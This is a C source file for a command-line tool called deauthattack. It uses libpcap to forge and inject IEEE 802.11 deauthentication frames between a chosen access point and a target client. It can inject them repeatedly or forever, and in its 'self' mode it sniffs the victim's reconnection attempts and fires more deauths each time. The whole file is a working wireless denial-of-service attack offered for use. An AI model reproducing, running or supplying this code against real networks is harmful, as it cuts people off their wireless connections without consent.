/* $Id: deauthattack.c,v 1.3 2011/04/20 15:42:24 phil Exp $*/
/*
 * Copyright (c) 2011 Dominik Lang <phildom@lavabit.com>
 *
 * Permission to use, copy, modify, and distribute this software for any
 * purpose with or without fee is hereby granted, provided that the above
 * copyright notice and this permission notice appear in all copies.
 *
 * THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
 * WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
 * ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
 * WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
 * ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
 * OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
 */

#include <sys/cdefs.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/ioctl.h>

#include <net/bpf.h>

#include <err.h>
#include <limits.h>
#include <pcap.h>
#include <pcap-int.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "decode.h"
#include "pdos80211.h"

__dead void	 help();
void		 inject();
void		 usage(int);
void		 sighdlr(int);
void		 self_inj(u_char *, const struct pcap_pkthdr *, const u_char *);

volatile sig_atomic_t	 quit = 0;
pcap_t			*pif = NULL;
struct mgmt_deauth	 deauth;
long long		 cnt = 0;
u_int			 ival = 0;
int			 sec = 0;

void
sighdlr(int sig)
{
	switch(sig) {
	case SIGTERM:
		/* FALLTHROUGH */
	case SIGINT:
		/* FALLTHROUGH */
	case SIGHUP:
		/* FALLTHROUGH */
	case SIGABRT:
		/* FALLTHROUGH */
	case SIGALRM:
		/* FALLTHROUGH */
	case SIGPIPE:
		/* FALLTHROUGH */
	case SIGTSTP:
		quit = 1;
		break;
	default:
		break;
	}
}



void
usage(int quit)
{
	fprintf(stderr,
"usage: deauthattack [-hftv] [-i interface] [-n count] [-r reason_code]\n"
"                    [-w ival[s]] -a bssid -c target_mac\n");

	if (quit)
		exit(1);
}

__dead void
help()
{
	usage(0);

	fprintf(stderr,
"options:\n"
"       -h              print this help\n"
"       -f              from Access Point to target client Station\n"
"       -t              to Access Point from target client Station\n"
"       -v              print packet which will be injected\n"
"       -i interface    specify the network interface\n"
"       -n count        inject count deauth frames;\n"
"                       a negative number injects forever\n"
"       -r reason_code  set Reason Code in the deauth frame\n"
"       -w ival[s]      inject every ival microseconds;\n"
"                       if an 's' is appended, inject every ival seconds\n"
"       -a bssid        MAC address of the Access Point\n"
"       -c target_mac   MAC address of the target client Station\n"
"defaults:\n"
"       -t\n"
"       -r 7\n"
"       -w 1000\n"
"       inject forever\n");

        exit(1);
}

int
main(int argc, char *argv[])
{
	struct bpf_program	 bpfprog;
	char			 errbuf[PCAP_ERRBUF_SIZE];
	const char		*errstr;
	char			*device, *f, *filter, *mac;
	struct mac_addr		 apaddr, claddr;
	size_t			 fs;
	int			 dir, dlt, last;
	int			 bflag, cflag, self, verbose;
	u_int16_t		 rc;
	char			 ch;

	bflag = 0;
	cflag = 0;
	device = NULL;
	dir = TO_DS;
	mac = NULL;
	rc = 0x0007;
	self = 0;
	verbose = 0;
	while ((ch = getopt(argc, argv, "a:c:fi:hn:r:stvw:")) != -1) {
		switch(ch) {
		case 'a':
			if ((str_to_mac(&apaddr, optarg)) == -1) {
				errx(1, "Invalid MAC address: %s",
				    optarg);
			}
			cpy_mac(&deauth.hdr.addr3, &apaddr);
			bflag = 1;
			break;
		case 'c':
			if ((str_to_mac(&claddr, optarg)) == -1) {
				errx(1, "Invalid MAC address: %s",
				    optarg);
			}
			mac = optarg;
			cflag = 1;
			break;
		case 'f':
			dir = FROM_DS;
			break;
		case 'i':
			device = optarg;
			break;
		case 'h':
			help();
			/* NOTREACHED */
		case 'n':
			cnt = strtonum(optarg, LLONG_MIN, LLONG_MAX,
			    &errstr);
			if (errstr)
				err(1, "Invalid Number");
			break;
		case 'r':
			rc = strtonum(optarg, 0, 65535, &errstr);
			if (errstr)
				err(1, "Reason Code must be in [0,65535]");
			break;
		case 's':
			self = 1;
			break;
		case 't':
			dir = TO_DS;
			break;
		case 'v':
			verbose = 1;
			break;
		case 'w':
			last = strlen(optarg) - 1;
			if (optarg[last] == 's') {
				optarg[last] = '\0';
				ival = strtonum(optarg, 0, UINT_MAX,
				    &errstr);
				if (errstr) {
					fprintf(stderr,
					    "Interval must be in [0,%u]!\n",
					    UINT_MAX);
					usage(1);
				}
				sec = 1;
			} else {
				ival = strtonum(optarg, 0, 999999, &errstr);
				if (errstr) {
					fprintf(stderr,
					    "Interval not in [0,1000000] "
					    "microseconds!\n");
					usage(1);
				}
				sec = 0;
			}
			break;
		default:
			usage(1);
			/* NOTREACHED */
		}
	}

	argc -= optind;
	argv += optind;

	if (!(bflag && cflag))
		usage(1);

	if (self && (cnt == 0))
		cnt = 5;

	if (device == NULL) {
		if ((device = pcap_lookupdev(errbuf)) == NULL)
			err(1, "Can't find suitable interface."
			    " Specify one with -i");
		fprintf(stderr, "No interface specified, using %s\n", device);
	}

	/* Prepare the interface:
	 * Open up the interface and set the datalink type to IEEE802_11.
	 */
	if ((pif = pcap_open_live(device, 3000, 1, 1000, errbuf)) == NULL)
		errx(1, "%s", errbuf);

	if ((dlt = pcap_datalink_name_to_val("IEEE802_11")) == -1)
		err(1, "Failure converting DLT from name to val.");

	if ((pcap_set_datalink(pif, dlt)) == -1)
		err(1, "Failure setting datalink type.");

	/*
	 * XXX Hack-Alert:
	 * Promiscious mode is disabled after setting the datalink type
	 * (accured on OpenBSD 4.8), so set it manually.
	 * On Mac OS X 10.6.7 promisc mode isn't disabled, so this isn't
	 * needed.
	 */
	ioctl(pif->fd, BIOCPROMISC, NULL);

	/*
	 * Construct the frame.
	 *
	 * Note:
	 * Sniffing showed that the duration in deauthentication frames
	 * is set to 0x3a 0x01.
	 * Reason Code 7 stands for: Class 3 received from nonassociated
	 * station. (IEEE Std. 802.11-2007)
	 */
	if (dir == TO_DS) {
		cpy_mac(&deauth.hdr.addr1, &apaddr);
		cpy_mac(&deauth.hdr.addr2, &claddr);
	} else {
		cpy_mac(&deauth.hdr.addr1, &claddr);
		cpy_mac(&deauth.hdr.addr2, &apaddr);
	}
	deauth.hdr.fc = htons(PROTO | DEAUTH_TYPE);
	deauth.hdr.dur = htons(0x3a01);
	deauth.hdr.sc = 0;
	/* deauth.reason_code = htons(rc); */
	 deauth.reason_code = rc;

	if (verbose)
		deauth_decode((u_char *)&deauth, MGMT_HDR_LEN + FIELD_RC_LEN);

	/* setup signal handlers */
	signal(SIGTERM, sighdlr);
	signal(SIGINT, sighdlr);
	signal(SIGHUP, sighdlr);
	signal(SIGABRT, sighdlr);
	signal(SIGALRM, sighdlr);
	signal(SIGPIPE, sighdlr);
	signal(SIGTSTP, sighdlr);


	/* inject the frame */
	if (verbose)
		printf("sending...\n");
	fflush(stdout);

	if (self) {
		f = "wlan type mgt and ("
		    " subtype auth or"
		    " subtype assocreq or subtype assocresp or"
		    " subtype reassocreq or subtype reassocresp ) and"
		    " wlan host ";
		fs = strlen(f) + strlen(mac) + 1;
		if ((filter = (char *)malloc(fs)) == NULL)
			err(1, "Error allocatint memory");
		if (strlcpy(filter, f, fs) >= fs)
			err(1, "Error creating filter");
		fs -= strlen(f);
		if (strlcpy(filter + strlen(filter), mac, fs) >= fs)
			err(1, "Error creating filter2");

		if (pcap_compile(pif, &bpfprog, filter, 1, 0))
			err(1, "Error compiling bpf filter");
		if (pcap_setfilter(pif, &bpfprog) == -1)
			err(1, "Couln't set filter");

		free(filter);

		inject();
		while (!quit) {
			if (pcap_dispatch(pif, 10, self_inj, NULL) == -1)
				err(1, "Error occured at receiving Frames");
		}

	} else {
		inject();
	}

	/* clean up */
	pcap_close(pif);
	
	return 0;
}

void
inject()
{
	long long	 c;
	size_t		 size = sizeof(struct mgmt_deauth);

	c = cnt;
	if (c <= 0)
		while (!quit) {
			if (pcap_inject(pif,  (void *)&deauth, size) == -1)
				err(1, "Error transmitting packet");

			if (sec)
				sleep(ival);
			else
				usleep(ival);
		}
	else
		while (!quit && (c-- > 0)) {
			if (pcap_inject(pif,  (void *)&deauth, size) == -1)
				err(1, "Error transmitting packet");

			if (c > 0) {
				if (sec)
					sleep(ival);
				else
					usleep(ival);
			}
		}
}

void
self_inj(__attribute__((unused))u_char *pif,
    __attribute__((unused))const struct pcap_pkthdr *pkthdr,
    __attribute__((unused))const u_char *pkt)
{
	inject();
}
